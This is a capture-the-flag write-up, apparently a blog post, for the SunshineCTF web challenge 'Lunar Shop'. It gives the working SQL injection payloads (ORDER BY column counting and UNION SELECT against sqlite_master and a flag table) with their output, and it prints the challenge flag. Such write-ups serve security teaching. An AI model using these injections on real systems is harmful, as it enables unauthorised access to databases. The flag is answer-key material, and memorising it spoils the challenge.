---
layout: post
title:  "Lunar Shop"
date:   2025-09-29 13:04:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /sunshine-2025-lunar-shop/
---

**Title:** Lunar Shop

**Category:** web

**Author:** alimuhammadsecured

**Description:** We have amazing new products for our gaming service! Unfortunately we don't sell our unreleased flag product yet !

> Fuzzing is NOT allowed for this challenge, doing so will lead to IP rate limiting!

[https://meteor.sunshinectf.games](https://meteor.sunshinectf.games)

I visit the site and see this source code:
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LunarShop 🚀</title>
</head>

<body>
    <header>
        <h1>LunarShop 🌌</h1>
        <p class="tagline">Space-themed game services & cosmic products just for you</p>
    </header>
    <main>
        <p> Welcome to <strong>LunarShop</strong> — the intergalactic marketplace where explorers, hackers, and dreamers can browse stellar products. From rocket fuel for your next mission 🚀 to rare moon rocks 🌑, we’ve got you covered. </p>
        <div class="cta"> <a href="[/products](view-source:https://meteor.sunshinectf.games/products)" class="button">View Products</a> </div>
    </main>
    <footer> ✨ Powered by stardust ✨ </footer>
</body>

</html>
```

I click view product and I can view products listed at `https://meteor.sunshinectf.games/product?product_id=1`. I can see products from id 1-11.

I visit `https://meteor.sunshinectf.games/product?product_id=11%20ORDER%20BY%201` and go from `ORDER BY 1` to `ORDER BY 5` where it errors. I now know there are 4 columns.

I visit `https://meteor.sunshinectf.games/product?product_id=11%20UNION%20SELECT%20NULL,name,NULL,NULL%20FROM%20sqlite_master%20WHERE%20type=%27table%27--` and see the second column holds the flag:
```shell
# 11 UNION SELECT NULL,name,NULL,NULL FROM sqlite_master WHERE type='table'--
# Available Space Products 🚀

|ID|Name|Description|Price|
|---|---|---|---|
|None|flag|None|None|
```

Dump it contents to get the flag. Visit `https://meteor.sunshinectf.games/product?product_id=11%20UNION%20SELECT%20NULL%2Cflag%2CNULL%2CNULL%20FROM%20flag--`:
```shell
# 11 UNION SELECT NULL,flag,NULL,NULL FROM flag--
# Available Space Products 🚀

|ID|Name|Description|Price|
|---|---|---|---|
|None|sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}|None|None|
```
`sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}`